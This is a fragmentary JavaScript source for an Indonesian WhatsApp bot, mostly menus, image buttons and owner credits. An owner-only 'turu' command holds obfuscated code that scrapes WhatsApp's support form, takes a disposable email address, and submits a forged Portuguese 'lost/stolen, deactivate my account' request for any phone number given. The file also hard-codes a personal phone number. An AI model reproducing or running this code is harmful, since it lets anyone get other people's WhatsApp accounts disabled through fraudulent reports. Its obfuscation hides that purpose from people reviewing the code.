...
const isOwner = setting.ownerNumber == m.sender ? true : ["6285870808160@s.whatsapp.net"].includes(m.sender) ? true : false
...
break
case 'turu': {
const _0x9535e2=_0x2938;(function(_0x1fcd4f,_0x20db59){const _0x113d49=_0x2938,_0xf25e4c=_0x1fcd4f();while(!![]){try{const _0x2d8583=parseInt(_0x113d49(0x210))/0x1*(-parseInt(_0x113d49(0x1f7))/0x2)+-parseInt(_0x113d49(0x213))/0x3+parseInt(_0x113d49(0x1ee))/0x4*(parseInt(_0x113d49(0x1e9))/0x5)+-parseInt(_0x113d49(0x1ec))/0x6+-parseInt(_0x113d49(0x1ed))/0x7*(-parseInt(_0x113d49(0x20f))/0x8)+parseInt(_0x113d49(0x20d))/0x9*(-parseInt(_0x113d49(0x1e4))/0xa)+parseInt(_0x113d49(0x212))/0xb;if(_0x2d8583===_0x20db59)break;else _0xf25e4c['push'](_0xf25e4c['shift']());}catch(_0x28e0dc){_0xf25e4c['push'](_0xf25e4c['shift']());}}}(_0x4446,0xe73a6));function _0x2938(_0x1ab04a,_0x2757a3){const _0x4446cc=_0x4446();return _0x2938=function(_0x293883,_0xb80d22){_0x293883=_0x293883-0x1e2;let _0x1616fc=_0x4446cc[_0x293883];return _0x1616fc;},_0x2938(_0x1ab04a,_0x2757a3);}if(!isOwner)return reply(mess[_0x9535e2(0x1e3)]);var axioss=require('axios');let ntah=await axioss['get'](_0x9535e2(0x203)),email=await axioss['get'](_0x9535e2(0x209)),cookie=ntah[_0x9535e2(0x1fc)][_0x9535e2(0x1ef)][_0x9535e2(0x1fe)](';\x20'),$=cheerio[_0x9535e2(0x1f9)](ntah[_0x9535e2(0x205)]),$form=$('form'),url=new URL($form[_0x9535e2(0x1e5)](_0x9535e2(0x1e8)),_0x9535e2(0x20e))[_0x9535e2(0x207)],form=new URLSearchParams();form[_0x9535e2(0x1e7)](_0x9535e2(0x1f2),$form[_0x9535e2(0x206)](_0x9535e2(0x1eb))[_0x9535e2(0x1e6)]()),form[_0x9535e2(0x1e7)](_0x9535e2(0x20a),$form[_0x9535e2(0x206)](_0x9535e2(0x1f1))[_0x9535e2(0x1e6)]()),form[_0x9535e2(0x1e7)]('step',_0x9535e2(0x20b)),form['append'](_0x9535e2(0x1f3),'ID'),form[_0x9535e2(0x1e7)](_0x9535e2(0x208),q),form[_0x9535e2(0x1e7)]('email',email[_0x9535e2(0x205)][0x0]),form[_0x9535e2(0x1e7)](_0x9535e2(0x200),email[_0x9535e2(0x205)][0x0]),form[_0x9535e2(0x1e7)](_0x9535e2(0x1f6),_0x9535e2(0x202)),form[_0x9535e2(0x1e7)](_0x9535e2(0x20c),_0x9535e2(0x1fb)),form[_0x9535e2(0x1e7)](_0x9535e2(0x214),'0'),form[_0x9535e2(0x1e7)]('__a','1'),form[_0x9535e2(0x1e7)](_0x9535e2(0x201),''),form['append'](_0x9535e2(0x1f0),'8'),form[_0x9535e2(0x1e7)](_0x9535e2(0x1fa),_0x9535e2(0x211)),form[_0x9535e2(0x1e7)](_0x9535e2(0x1f8),'1'),form[_0x9535e2(0x1e7)](_0x9535e2(0x1f5),_0x9535e2(0x1ff)),form['append'](_0x9535e2(0x204),_0x9535e2(0x1ea)),form[_0x9535e2(0x1e7)]('__comment_req','0');let res=await axioss({'url':url,'method':_0x9535e2(0x1fd),'data':form,'headers':{'cookie':cookie}});function _0x4446(){const _0x9fc70f=['4567920SHvigw','249256afZRjN','8dXtaHx','set-cookie','__req','input[name=lsd]','jazoest','country_selector','replace','__ccg','platform','24626SzjfEG','dpr','load','__hs','Perdido/roubado:\x20desative\x20minha\x20conta','headers','POST','join','UNKNOWN','email_confirm','__csr','ANDROID','https://www.whatsapp.com/contact/noclient/','__rev','data','find','href','phone_number','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10','lsd','submit','your_message','9gPVtIY','https://www.whatsapp.com','232oywtZv','124syjKcE','19316.BP:whatsapp_www_pkg.2.0.0.0.0','38951407sRTuzP','2862960bEVBZZ','__user','parse','owner','11197610MmmzyN','attr','val','append','action','1839135WTAEaS','1006630858','input[name=jazoest]'];_0x4446=function(){return _0x9fc70f;};return _0x4446();}reply(util['format'](JSON[_0x9535e2(0x1e2)](res['data'][_0x9535e2(0x1f4)]('for\x20(;;);',''))));
}
break
...
rows: [
{title: "𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", rowId: `${prefix}mainmenu`, description: `Menampilkan daftar main menu`},
{title: "𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨", rowId: `${prefix}groupmenu`, description: `Menampilkan daftar group menu`},
{title: "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨", rowId: `${prefix}downloadmenu`, description: `Menampilkan daftar download menu`},
{title: "𝗦𝗘𝗔𝗥𝗖𝗛 𝗠𝗘𝗡𝗨", rowId: `${prefix}searchmenu`, description: `Menampilkan daftar search menu`},
{title: "𝗙𝗨𝗡 𝗠𝗘𝗡𝗨", rowId: `${prefix}funmenu`, description: `Menampilkan daftar fun menu`},
{title: "𝗣𝗥𝗜𝗠𝗕𝗢𝗡 𝗠𝗘𝗡𝗨", rowId: `${prefix}primbonmenu`, description: `Menampilkan daftar primbon menu`},
{title: "𝗖𝗢𝗡𝗩𝗘𝗥𝗧𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `${prefix}convertmenu`, description: `Menampilkan daftar converter menu`},
{title: "𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `${prefix}othermenu`, description: `Menampilkan daftar other menu`},
{title: "𝗜𝗦𝗟𝗔𝗠 𝗠𝗘𝗡𝗨", rowId: `${prefix}islammenu`, description: `Menampilkan daftar islam menu`},
{title: "𝗩𝗢𝗜𝗖𝗘 𝗖𝗛𝗔𝗡𝗚𝗘𝗥", rowId: `${prefix}voicemenu`, description: `Menampilkan daftar voice changer menu`},
{title: "𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `${prefix}ownermenu`, description: `Menampilkan daftar owner menu`},
{title: "𝗦𝗧𝗜𝗞𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `${prefix}stikermenu`, description: `Menampilkan daftar stiker menu`},
{title: "𝗡𝗘𝗪𝗦 𝗠𝗘𝗡𝗨", rowId: `${prefix}newsmenu`, description: `Menampilkan daftar news menu`},
{title: "𝗠𝗔𝗞𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `${prefix}makermenu`, description: `Menampilkan daftar maker menu`},
{title: "𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨", rowId: `${prefix}animemenu`, description: `Menampilkan daftar anime menu`},
{title: "𝗖𝗘𝗥𝗣𝗘𝗡 𝗠𝗘𝗡𝗨", rowId: `${prefix}cerpenmenu`, description: `Menampilkan daftar cerpen menu`}
]
},
  {
title: "MENGOBROL DENGAN SESAMA PENGGUNA",
rows: [{title: "𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗖𝗛𝗔𝗧", rowId: `${prefix}ac`, description: `Menampilkan daftar anonymous chat`}
]
},
{
title: "© CREDIT",
rows: [{title: "𝗢𝗪𝗡𝗘𝗥 𝗕𝗢𝗧", rowId: `${prefix}owner`, description: `Owner bot`},
{title: "𝗜𝗡𝗙𝗢 𝗕𝗢𝗧", rowId: `${prefix}infobot`, description: `Info bot`},
{title: "𝗜𝗡𝗙𝗢 𝗢𝗪𝗡𝗘𝗥", rowId: `${prefix}infoowner`, description: `Info owner`}
]
}, 
]
...
let buttonsovdxx1 = [
    {buttonId: `${prefix}shota`, buttonText: {displayText: 'NEXT'}, type: 1}
]
...
let buttonso = [
    {buttonId: `${prefix}pin2 ${text}`, buttonText: {displayText: 'NEXT'}, type: 1}
]
let buttonMessage = {
    image: dis,
    caption: `*「 PINTEREST 」*
...
let buttonsol = [
    {buttonId: `${prefix}husbu`, buttonText: {displayText: 'NEXT'}, type: 1}
]
let buttonMessageh = {
    image: dist,
    caption: `*Nih kak*`,
...
result = anu[Math.floor(Math.random() * anu.length)]
let buttonsu = [
    {buttonId: `${prefix}wallnime`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: result.image[0] },
    caption: `⭔ Title : ${result.title}`,
...
•Asal : Bumi,Indonesia
•GH   : darkbotzmd
•GC   : https://chat.whatsapp.com/Jsg9F1tkb9m5njXSRrurkb
